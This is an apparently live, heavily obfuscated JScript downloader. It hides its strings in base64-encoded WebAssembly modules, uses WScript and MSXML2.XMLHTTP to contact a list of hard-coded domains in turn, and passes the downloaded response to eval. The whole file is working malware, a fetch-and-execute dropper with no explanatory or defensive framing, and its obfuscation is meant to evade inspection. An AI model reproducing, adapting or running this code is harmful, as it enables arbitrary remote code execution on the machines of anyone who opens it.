const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
const __callWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEGuoGAgAAhfwBBAQt/AEEGC38AQQoLfwBBDgt/AEESC38AQRYLfwBBGAt/AEEeC38AQSALfwBBJgt/AEEqC38AQS4LfwBBMgt/AEHKAAt/AEHsAAt/AEGOAQt/AEGiAQt/AEGyAQt/AEG4AQt/AEGyAgt/AEG2Agt/AEHEAgt/AEHGAgt/AEHIAgt/AEHKAgt/AEHMAgt/AEHQAgt/AEHUAgt/AEHYAgt/AEHeAgt/AEHgAgt/AEHmAgt/AEHqAgsHqYKAgAAiBm1lbW9yeQIABWRhdGEwAwAFZGF0YTEDAQVkYXRhMgMCBWRhdGEzAwMFZGF0YTQDBAVkYXRhNQMFBWRhdGE2AwYFZGF0YTcDBwVkYXRhOAMIBWRhdGE5AwkGZGF0YTEwAwoGZGF0YTExAwsGZGF0YTEyAwwGZGF0YTEzAw0GZGF0YTE0Aw4GZGF0YTE1Aw8GZGF0YTE2AxAGZGF0YTE3AxEGZGF0YTE4AxIGZGF0YTE5AxMGZGF0YTIwAxQGZGF0YTIxAxUGZGF0YTIyAxYGZGF0YTIzAxcGZGF0YTI0AxgGZGF0YTI1AxkGZGF0YTI2AxoGZGF0YTI3AxsGZGF0YTI4AxwGZGF0YTI5Ax0GZGF0YTMwAx4GZGF0YTMxAx8GZGF0YTMyAyAL9YOAgAAhAEEBCwQlMkYAAEEGCwJ0AABBCgsCRwAAQQ4LAkUAAEESCwJUAABBFgsBAABBGAsEJTNBAABBHgsBAABBIAsEJTdDAABBJgsCcAAAQSoLAmgAAEEuCwJTAABBMgsWbmFpbGNvdW50cnlhbmR0YW4uY29tAABBygALIXNjb3JwaW9ua2luZ2NsZWFuaW5nc2VydmljZXMuY29tAABB7AALIXBhc2htaW5hcy50cnVlY29tcGFzc2Rlc2lnbnMubmV0AABBjgELEmJ1c3RpbmdhcHJvc2UuY29tAABBogELD3Zpeml0LXRvdXIuY29tAABBsgELBCU3QwAAQbgBC3kwMDAwMDAxMk5IaGlZSFN3UEFLN0txRnFFYlJXZzJwandwa2cyQ3RqcldzRTlwRFFobDNvWE0yRWJiTjdHYmk0NTVidHhFeUV3WXlXTEc4VWVOWmZaUDM0UUVHSlQyckVKZGxVZURIOF83TmxOa2M5V3FWbGRoQmwAAEGyAgsCTQAAQbYCCwxYTUwyLlhNTEhUVAAAQcQCCwEAAEHGAgsBAABByAILAQAAQcoCCwEAAEHMAgsCYwAAQdACCwJvAABB1AILAnUAAEHYAgsFbnRlcgAAQd4CCwEAAEHgAgsEJTNGAABB5gILAmEAAEHqAgsFZXZhbAA='].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
var zn = lS(0, 0), kt = lS(0, 1);
var ih = lS(0, 2) + lS(0, 3) + lS(0, 4) + lS(0, 5);
var mter = lS(0, 6) + lS(0, 7);
var ost = lS(0, 8);
var zx = lS(0, 9), ZHUL = lS(0, 10), tus = lS(0, 11);
var x = (lS(0, 12) + ost + lS(0, 13) + ost + lS(0, 14) + ost + lS(0, 15) + ost + lS(0, 16)).split(lS(0, 17));
var m = lS(0, 18);
for (var i = 0; i < x.length; i++) {
    var e = WScript.CreateObject(lS(0, 19) + tus + lS(0, 20) + zx.toUpperCase());
    try {
        var tjkh = x[i + 0];
        var gfyu = zn + lS(0, 21);
        (() => {
            const __callInstance1 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        e.open(ih, ZHUL.concat(lS(0, 22) + kt + lS(0, 23)) + kt + lS(0, 24) + zx + mter + zn + zn + tjkh + zn + lS(0, 25) + lS(0, 26) + lS(0, 27) + lS(0, 28) + lS(0, 29) + gfyu + lS(0, 30) + m, false);
                    }
                }
            });
            const __exports = __callInstance1.exports;
            return __exports.data();
        })();
        (() => {
            const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        e.send();
                    }
                }
            });
            const __exports = __callInstance0.exports;
            return __exports.data();
        })();
        var r = e.responseText;
        var zhim = 500;
        var got = 50 + 450 + zhim;
        if (r.length > got && r.indexOf(m) > got + 1 - 1002) {
            var pirush = r.split(m);
            var ikagdh = pirush.join(lS(0, 31));
            window[lS(0, 32, true)](ikagdh);
            break;
        }
        ;
    } catch (e) {
    }
    ;
}
;